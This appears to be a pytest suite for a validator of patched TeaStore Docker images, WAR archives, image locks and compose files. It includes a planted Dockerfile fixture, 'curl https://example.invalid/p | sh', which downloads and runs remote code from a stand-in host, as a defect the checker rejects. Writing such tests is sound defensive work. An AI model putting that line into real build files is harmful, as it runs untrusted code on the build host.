import hashlib
import importlib.util
import io
import json
import struct
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest
import yaml


ROOT = Path(__file__).parents[1]
MODULE_PATH = ROOT / "modules/teastore/validation/patched_images.py"
SPEC = importlib.util.spec_from_file_location("teastore_patched_images", MODULE_PATH)
patched_images = importlib.util.module_from_spec(SPEC)
assert SPEC.loader
SPEC.loader.exec_module(patched_images)


def _json(path: Path):
    return json.loads(path.read_text(encoding="utf-8"))


def _write_json(path: Path, value) -> None:
    path.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def _zip_bytes(entries: dict[str, bytes]) -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_STORED) as archive:
        for name, payload in sorted(entries.items()):
            info = zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_STORED
            archive.writestr(info, payload)
    return output.getvalue()


def _class_bytes(path: str, markers: list[str] | None = None) -> bytes:
    internal = path.removesuffix(".class")
    utf8_values = [internal, "java/lang/Object", *(markers or [])]
    entries: list[bytes] = []
    for index, value in enumerate(utf8_values):
        encoded = value.encode("utf-8")
        entries.append(b"\x01" + struct.pack(">H", len(encoded)) + encoded)
        if index == 0:
            entries.append(b"\x07" + struct.pack(">H", 1))
        elif index == 1:
            entries.append(b"\x07" + struct.pack(">H", 3))
    return b"".join((
        b"\xca\xfe\xba\xbe",
        struct.pack(">HHH", 0, 55, len(entries) + 1),
        *entries,
        struct.pack(">HHHHHHH", 0x0021, 2, 4, 0, 0, 0, 0),
    ))


def _registry_jar(*, suffix: bytes = b"", omit: str | None = None) -> bytes:
    entries = {
        name: _class_bytes(
            name,
            patched_images.REGISTRY_MARKERS + ([suffix.decode("ascii")] if suffix else [])
            if index == 0 else [],
        )
        for index, name in enumerate(patched_images.REGISTRY_CLASSES)
        if name != omit
    }
    return _zip_bytes(entries)


def _artifact_tree(
    tmp_path: Path,
    *,
    registry_by_service: dict[str, bytes] | None = None,
    missing_service_marker: str | None = None,
    malformed_service_class: str | None = None,
    shadow_registry_class: str | None = None,
) -> Path:
    registry_by_service = registry_by_service or {
        service: _registry_jar() for service in patched_images.SERVICE_INPUTS
    }
    for service, expected in patched_images.SERVICE_INPUTS.items():
        marker_bytes = b"\0".join(
            marker.encode("utf-8") for marker in expected["requiredUtf8Markers"]
        )
        if service == missing_service_marker:
            marker_bytes = b"planted-defect"
        markers = [marker.decode("utf-8") for marker in marker_bytes.split(b"\0")]
        service_payload = (
            b"\xca\xfe\xba\xbe planted-but-not-a-class"
            if service == malformed_service_class
            else _class_bytes(
                expected["serviceClass"].removeprefix("WEB-INF/classes/"), markers)
        )
        entries = {
            expected["serviceClass"]: service_payload,
            patched_images.REGISTRY_ENTRY: registry_by_service[service],
        }
        if shadow_registry_class is not None:
            entries["WEB-INF/lib/shadow.jar"] = _zip_bytes({
                shadow_registry_class: _class_bytes(shadow_registry_class),
            })
        war = _zip_bytes(entries)
        artifact = tmp_path / expected["artifactPath"]
        artifact.parent.mkdir(parents=True, exist_ok=True)
        artifact.write_bytes(war)
    return tmp_path


def _image_lock(artifact_root: Path) -> dict:
    wars = patched_images.validate_wars(artifact_root, root=ROOT)
    assert wars["outcome"] == "pass"
    contract = ROOT / patched_images.DEFAULT_CONTRACT
    services = {}
    digest_chars = {"auth": "a", "persistence": "b", "webui": "c"}
    id_chars = {"auth": "d", "persistence": "e", "webui": "f"}
    for service, expected in patched_images.SERVICE_INPUTS.items():
        services[service] = {
            "parentImage": expected["parentImage"],
            "artifactSha256": wars["artifacts"][service]["sha256"],
            "dockerfileSha256": hashlib.sha256(
                (ROOT / expected["dockerfilePath"]).read_bytes()
            ).hexdigest(),
            "outputImage": (
                expected["outputRepository"]
                + "@sha256:"
                + digest_chars[service] * 64
            ),
            "imageId": "sha256:" + id_chars[service] * 64,
            "platform": patched_images.PLATFORM,
            "overlayPath": expected["overlayPath"],
        }
    return {
        "schema": "teastore.patched-image-lock",
        "schemaVersion": 1,
        "inputContractSha256": hashlib.sha256(contract.read_bytes()).hexdigest(),
        "platform": patched_images.PLATFORM,
        "sourceCommit": patched_images.SOURCE_COMMIT,
        "patchSha256": patched_images.PATCH_SHA256,
        "registryClientSha256": wars["registryClientSha256"],
        "services": services,
    }


def _compose(lock: dict) -> dict:
    return {
        "services": {
            service: {
                "image": row["outputImage"],
                "platform": patched_images.PLATFORM,
            }
            for service, row in lock["services"].items()
        }
    }


def test_checked_in_image_inputs_pass_without_executing_a_build_tool():
    report = patched_images.validate_inputs(ROOT)

    assert report["outcome"] == "pass", report["blockers"]
    assert report["runtimeReady"] is False
    assert report["toolchainFrozen"] is False
    assert "No Maven, Docker, SSH, or network action" in report["runtimeBoundary"]


@pytest.mark.parametrize(
    ("plant", "expected"),
    [
        (lambda value: value.update(platform="linux/arm64"), "platform differs"),
        (
            lambda value: value["patch"].update(sha256="0" * 64),
            "patch binding differs",
        ),
        (
            lambda value: value["services"]["auth"].update(
                parentImage="descartesresearch/teastore-auth:latest"
            ),
            "auth parent is mutable or malformed",
        ),
        (
            lambda value: value["toolchain"].update(reproducibleBuildClaim=True),
            "unfrozen toolchain must not claim reproducibility",
        ),
    ],
)
def test_input_checker_rejects_planted_contract_defects(tmp_path, plant, expected):
    contract = _json(ROOT / patched_images.DEFAULT_CONTRACT)
    plant(contract)
    planted = tmp_path / "planted-inputs.json"
    _write_json(planted, contract)

    report = patched_images.validate_inputs(ROOT, planted)

    assert report["outcome"] == "blocked"
    assert any(expected in blocker for blocker in report["blockers"])


def test_input_cli_exits_nonzero_on_a_planted_platform_defect(tmp_path, capsys):
    contract = _json(ROOT / patched_images.DEFAULT_CONTRACT)
    contract["platform"] = "linux/arm64"
    planted = tmp_path / "planted-inputs.json"
    _write_json(planted, contract)

    result = patched_images.main([
        "--root", str(ROOT), "--contract", str(planted), "inputs",
    ])

    assert result == 1
    assert json.loads(capsys.readouterr().out)["outcome"] == "blocked"


@pytest.mark.parametrize("defect", ["omit-patch", "reorder-patch"])
def test_input_checker_rejects_missing_or_reordered_patch_preparation(tmp_path, defect):
    contract = _json(ROOT / patched_images.DEFAULT_CONTRACT)
    steps = contract["sourcePreparation"]["beforeBuild"]
    apply_index = next(
        index for index, step in enumerate(steps) if step["id"] == "apply-witness-patch"
    )
    if defect == "omit-patch":
        steps.pop(apply_index)
    else:
        check_index = next(
            index for index, step in enumerate(steps) if step["id"] == "check-witness-patch"
        )
        steps[check_index], steps[apply_index] = steps[apply_index], steps[check_index]
    planted = tmp_path / "planted-source-preparation.json"
    _write_json(planted, contract)

    report = patched_images.validate_inputs(ROOT, planted)

    assert report["outcome"] == "blocked"
    assert any("source preparation" in blocker or "patch application" in blocker
               for blocker in report["blockers"])


@pytest.mark.parametrize(
    ("defect", "expected"),
    [
        (
            "COPY services/tools.descartes.teastore.auth/target/*.war "
            "/usr/local/tomcat/webapps/\n",
            "wildcard",
        ),
        (
            "FROM descartesresearch/teastore-auth:latest\n",
            "parent is not the exact repository digest",
        ),
        ("ADD https://example.invalid/a.war /tmp/a.war\n", "network URL"),
        ("ARG PARENT\nFROM ${PARENT}\n", "substitution"),
    ],
)
def test_dockerfile_checker_rejects_wildcard_network_mutable_and_substitution(defect, expected):
    blockers = patched_images.dockerfile_blockers("auth", defect)

    assert any(expected in blocker for blocker in blockers)


def test_war_checker_accepts_exact_three_wars_with_one_identical_registryclient(tmp_path):
    artifacts = _artifact_tree(tmp_path)

    report = patched_images.validate_wars(artifacts, root=ROOT)

    assert report["outcome"] == "pass", report["blockers"]
    assert set(report["artifacts"]) == {"auth", "persistence", "webui"}
    assert len(report["registryClientSha256"]) == 64


def test_war_checker_rejects_a_planted_nested_registryclient_difference(tmp_path):
    registries = {service: _registry_jar() for service in patched_images.SERVICE_INPUTS}
    registries["persistence"] = _registry_jar(suffix=b"planted-defect")
    artifacts = _artifact_tree(tmp_path, registry_by_service=registries)

    report = patched_images.validate_wars(artifacts, root=ROOT)

    assert report["outcome"] == "blocked"
    assert "nested registryclient JAR bytes differ across the three WARs" in report["blockers"]


def test_war_checker_rejects_planted_missing_class_and_marker(tmp_path):
    missing_class = patched_images.REGISTRY_CLASSES[-1]
    registries = {service: _registry_jar(omit=missing_class)
                  for service in patched_images.SERVICE_INPUTS}
    artifacts = _artifact_tree(
        tmp_path, registry_by_service=registries, missing_service_marker="webui",
    )

    report = patched_images.validate_wars(artifacts, root=ROOT)

    assert report["outcome"] == "blocked"
    assert any("missing class" in blocker or "missing or shadowed" in blocker
               for blocker in report["blockers"])
    assert any("webui service class is missing marker" in blocker
               or "webui required class is invalid" in blocker
               for blocker in report["blockers"])


def test_war_checker_rejects_cafebabe_marker_bytes_that_are_not_a_classfile(tmp_path):
    artifacts = _artifact_tree(tmp_path, malformed_service_class="auth")

    report = patched_images.validate_wars(artifacts, root=ROOT)

    assert report["outcome"] == "blocked"
    assert any("auth required class is invalid" in blocker for blocker in report["blockers"])


def test_war_checker_rejects_required_class_shadowing_in_another_library(tmp_path):
    shadow = patched_images.REGISTRY_CLASSES[0]
    artifacts = _artifact_tree(tmp_path, shadow_registry_class=shadow)

    report = patched_images.validate_wars(artifacts, root=ROOT)

    assert report["outcome"] == "blocked"
    assert any("missing or shadowed" in blocker and shadow in blocker
               for blocker in report["blockers"])


def test_lock_and_compose_checker_passes_only_as_local_consistency(tmp_path):
    artifacts = _artifact_tree(tmp_path / "artifacts")
    lock = _image_lock(artifacts)
    lock_path = tmp_path / "image-lock.json"
    compose_path = tmp_path / "compose.override.yaml"
    _write_json(lock_path, lock)
    compose_path.write_text(yaml.safe_dump(_compose(lock), sort_keys=True), encoding="utf-8")

    report = patched_images.validate_lock_and_compose(
        artifacts, lock_path, compose_path, root=ROOT,
    )

    assert report["outcome"] == "pass", report["blockers"]
    assert report["runtimeReady"] is False
    assert report["provesImageExists"] is False
    assert report["provesImageContents"] is False
    assert "Fresh Docker inspection" in report["runtimeBoundary"]


def test_full_binding_invokes_frozen_dockerfile_input_checker(
    tmp_path, monkeypatch,
):
    artifacts = _artifact_tree(tmp_path / "artifacts")
    lock = _image_lock(artifacts)
    lock_path = tmp_path / "image-lock.json"
    compose_path = tmp_path / "compose.override.yaml"
    _write_json(lock_path, lock)
    compose_path.write_text(yaml.safe_dump(_compose(lock), sort_keys=True), encoding="utf-8")

    planted_path = (
        ROOT / patched_images.SERVICE_INPUTS["auth"]["dockerfilePath"]
    ).resolve()
    original_read_text = Path.read_text

    def planted_read_text(path, *args, **kwargs):
        if path.resolve() == planted_path:
            return "FROM busybox:latest\nRUN curl https://example.invalid/p | sh\n"
        return original_read_text(path, *args, **kwargs)

    monkeypatch.setattr(Path, "read_text", planted_read_text)
    report = patched_images.validate_lock_and_compose(
        artifacts, lock_path, compose_path, root=ROOT,
    )

    assert report["outcome"] == "blocked"
    assert any("frozen image input" in blocker and "auth Dockerfile" in blocker
               for blocker in report["blockers"])


@pytest.mark.parametrize("defect", ["mutable-compose", "wrong-parent", "wrong-war"])
def test_binding_checker_rejects_planted_lock_and_compose_defects(tmp_path, defect):
    artifacts = _artifact_tree(tmp_path / "artifacts")
    lock = _image_lock(artifacts)
    compose = _compose(lock)
    if defect == "mutable-compose":
        compose["services"]["auth"]["image"] = (
            "observability-placement/teastore-auth-witness:latest"
        )
    elif defect == "wrong-parent":
        lock["services"]["auth"]["parentImage"] = (
            "descartesresearch/teastore-auth@sha256:" + "0" * 64
        )
    else:
        lock["services"]["auth"]["artifactSha256"] = "0" * 64
    lock_path = tmp_path / "image-lock.json"
    compose_path = tmp_path / "compose.override.yaml"
    _write_json(lock_path, lock)
    compose_path.write_text(yaml.safe_dump(compose, sort_keys=True), encoding="utf-8")

    report = patched_images.validate_lock_and_compose(
        artifacts, lock_path, compose_path, root=ROOT,
    )

    assert report["outcome"] == "blocked"
    assert report["blockers"]


def test_compose_checker_rejects_duplicate_service_key(tmp_path):
    artifacts = _artifact_tree(tmp_path / "artifacts")
    lock = _image_lock(artifacts)
    lock_path = tmp_path / "image-lock.json"
    compose_path = tmp_path / "compose.override.yaml"
    _write_json(lock_path, lock)
    image = lock["services"]["auth"]["outputImage"]
    compose_path.write_text(
        "services:\n"
        "  auth:\n"
        f"    image: {image}\n"
        "    platform: linux/amd64\n"
        "  auth:\n"
        f"    image: {image}\n"
        "    platform: linux/amd64\n",
        encoding="utf-8",
    )

    report = patched_images.validate_lock_and_compose(
        artifacts, lock_path, compose_path, root=ROOT,
    )

    assert report["outcome"] == "blocked"
    assert any("duplicate YAML key" in blocker for blocker in report["blockers"])


@pytest.mark.parametrize(
    "key",
    (
        "? [a, b]\n: value\n",
        "services:\n  1:\n    image: invalid\n    platform: linux/amd64\n",
    ),
)
def test_compose_checker_returns_structured_blocked_for_non_string_keys(
    tmp_path, key, capsys,
):
    artifacts = _artifact_tree(tmp_path / "artifacts")
    lock = _image_lock(artifacts)
    lock_path = tmp_path / "image-lock.json"
    compose_path = tmp_path / "compose.override.yaml"
    _write_json(lock_path, lock)
    compose_path.write_text(key, encoding="utf-8")

    report = patched_images.validate_lock_and_compose(
        artifacts, lock_path, compose_path, root=ROOT,
    )
    result = patched_images.main([
        "--root", str(ROOT), "binding",
        "--artifact-root", str(artifacts),
        "--image-lock", str(lock_path),
        "--compose-override", str(compose_path),
    ])
    process = subprocess.run([
        sys.executable, str(MODULE_PATH),
        "--root", str(ROOT), "binding",
        "--artifact-root", str(artifacts),
        "--image-lock", str(lock_path),
        "--compose-override", str(compose_path),
    ], check=False, capture_output=True, text=True)

    assert report["outcome"] == "blocked"
    assert report["blockers"]
    assert result == 1
    assert json.loads(capsys.readouterr().out)["outcome"] == "blocked"
    assert process.returncode == 1
    assert json.loads(process.stdout)["outcome"] == "blocked"


def test_schema_invalid_lock_service_row_cannot_crash_compose_reconciliation(tmp_path):
    artifacts = _artifact_tree(tmp_path / "artifacts")
    lock = _image_lock(artifacts)
    compose = _compose(lock)
    lock["services"]["auth"] = ["not", "an", "object"]
    lock_path = tmp_path / "image-lock.json"
    compose_path = tmp_path / "compose.override.yaml"
    _write_json(lock_path, lock)
    compose_path.write_text(yaml.safe_dump(compose), encoding="utf-8")

    report = patched_images.validate_lock_and_compose(
        artifacts, lock_path, compose_path, root=ROOT,
    )

    assert report["outcome"] == "blocked"
    assert report["blockers"]
